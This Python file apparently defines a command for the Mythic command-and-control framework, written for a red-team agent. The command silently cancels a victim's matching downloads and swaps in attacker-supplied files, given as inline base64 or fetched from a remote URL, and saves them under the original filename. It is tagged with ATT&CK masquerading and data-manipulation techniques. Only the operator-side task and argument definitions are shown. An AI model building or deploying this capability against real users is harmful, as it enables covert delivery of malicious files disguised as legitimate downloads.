from mythic_container.MythicCommandBase import (
    CommandBase, TaskArguments, CommandParameter, ParameterType,
    MythicTask, PTTaskMessageAllData, PTTaskProcessResponseMessageResponse,
    CommandAttributes,
)


class DownloadInterceptStartArguments(TaskArguments):
    def __init__(self, command_line, **kwargs):
        super().__init__(command_line, **kwargs)
        self.args = [
            CommandParameter(
                name="pattern",
                type=ParameterType.String,
                description="URL or filename substring to match (case-insensitive). The replacement is saved with the original filename.",
            ),
            CommandParameter(
                name="content_b64",
                type=ParameterType.String,
                description="Base64-encoded replacement file content (use for smaller files)",
                default_value="",
            ),
            CommandParameter(
                name="replace_url",
                type=ParameterType.String,
                description="URL to fetch the replacement file from at intercept time (use for larger files)",
                default_value="",
            ),
        ]

    async def parse_arguments(self):
        if self.command_line.strip():
            self.load_args_from_json_string(self.command_line)


class DownloadInterceptStartCommand(CommandBase):
    cmd            = "download_intercept_start"
    needs_admin    = False
    help_cmd       = "download_intercept_start"
    description    = (
        "Arm a download intercept rule. When the user initiates a download whose "
        "URL or filename contains the pattern, the original download is cancelled "
        "and silently replaced. The replacement is saved under the original filename. "
        "Supports inline base64 content (content_b64) or a fetch URL (replace_url). "
        "Multiple rules can be active simultaneously."
    )
    version        = 1
    author         = "@asaurusrex"
    argument_class = DownloadInterceptStartArguments
    parameters     = []
    attackmapping  = ["T1036", "T1565"]
    attributes     = CommandAttributes(filter_by_build_parameter={}, supported_os=[])

    async def create_tasking(self, task: MythicTask) -> MythicTask:
        pattern = task.args.get_arg("pattern")
        task.display_params = f'pattern="{pattern}"'
        return task

    async def process_response(
        self, task: PTTaskMessageAllData, response: any
    ) -> PTTaskProcessResponseMessageResponse:
        return PTTaskProcessResponseMessageResponse(TaskID=task.Task.ID, Success=True)
